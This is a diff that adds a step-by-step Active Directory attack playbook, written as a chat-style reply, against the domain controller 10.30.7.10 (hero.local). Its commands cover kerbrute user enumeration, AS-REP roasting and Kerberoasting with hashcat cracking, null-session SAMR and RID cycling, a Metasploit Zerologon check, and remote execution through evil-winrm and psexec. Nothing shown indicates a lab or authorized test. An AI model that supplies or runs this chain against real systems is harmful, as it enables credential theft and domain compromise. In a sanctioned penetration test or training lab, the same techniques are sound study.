@@ -16,3 +16,69 @@ ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
 # 3) Pull SPNs for kerberoast (works best with creds, but enumerate anyway)
 ldapsearch -x -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL \
 '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
+
+You hit “Operations error … a successful bind must be completed” — that means the DC allows RootDSE reads but blocks anonymous subtree queries. So LDAP will only give you real data after you authenticate (simple bind or Kerberos). Two paths from here:
+
+A) No-creds path (what you can do right now)
+
+Enumerate valid usernames (Kerberos, no bind needed)
+
+# build/borrow a seed list: common names + svc_, sql_, iis_, backup, helpdesk, admin
+kerbrute userenum -d hero.local --dc 10.30.7.10 users_seed.txt -o valid_users.txt
+
+
+AS-REP roast any “Do not require preauth” users
+
+GetNPUsers.py hero.local/ -dc-ip 10.30.7.10 \
+  -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt
+# crack (hashcat mode 18200)
+hashcat -m 18200 asrep_hashes.txt wordlist.txt
+
+
+Try null over SAMR/LSA (sometimes still works even when LDAP anon is blocked)
+
+rpcclient -U "" -N 10.30.7.10 -c "lsaquery; enumdomains; querydominfo; enumdomusers"  # if lucky → users
+lookupsid.py @10.30.7.10   # RID cycling if domain SID leaks
+
+
+Quick Netlogon vuln check (cheap, safe)
+
+msfconsole -q -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 10.30.7.10; run; exit"
+
+
+If nothing pops, prep a very slow, lockout-safe spray later once you have a solid user list.
+
+B) With creds (even low-priv)
+
+Once you get any working account, bind and pull everything.
+
+Simple bind (username/password):
+
+ldapsearch -H ldap://10.30.7.10:3268 -D "user@hero.local" -w 'Passw0rd!' \
+  -b "DC=hero,DC=local" -s sub -LLL "(objectClass=user)" sAMAccountName userPrincipalName memberOf
+ldapsearch -H ldap://10.30.7.10:3268 -D "user@hero.local" -w 'Passw0rd!' \
+  -b "DC=hero,DC=local" -s sub -LLL "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+
+
+Kerberos bind (ticket):
+
+kinit user@HERO.LOCAL
+ldapsearch -Y GSSAPI -H ldap://10.30.7.10:3268 -b "DC=hero,DC=local" -s sub -LLL "(objectClass=user)" sAMAccountName
+
+
+Then move to:
+
+# Kerberoast
+GetUserSPNs.py hero.local/user:'Passw0rd!' -dc-ip 10.30.7.10 -request -outputfile kerberoast.ccache
+
+# Remote exec if rights allow (you have WinRM/SCMR)
+evil-winrm -i 10.30.7.10 -u user -p 'Passw0rd!'
+msf> use exploit/windows/smb/psexec
+
+TL;DR
+
+Your LDAP subtree queries failed because anon bind is disabled.
+
+Keep going without creds via Kerberos userenum → AS-REP roast and SAMR null attempts.
+
+As soon as you get any creds, bind to LDAP and harvest users/SPNs, then Kerberoast and pivot to WinRM/SCMR for execution.
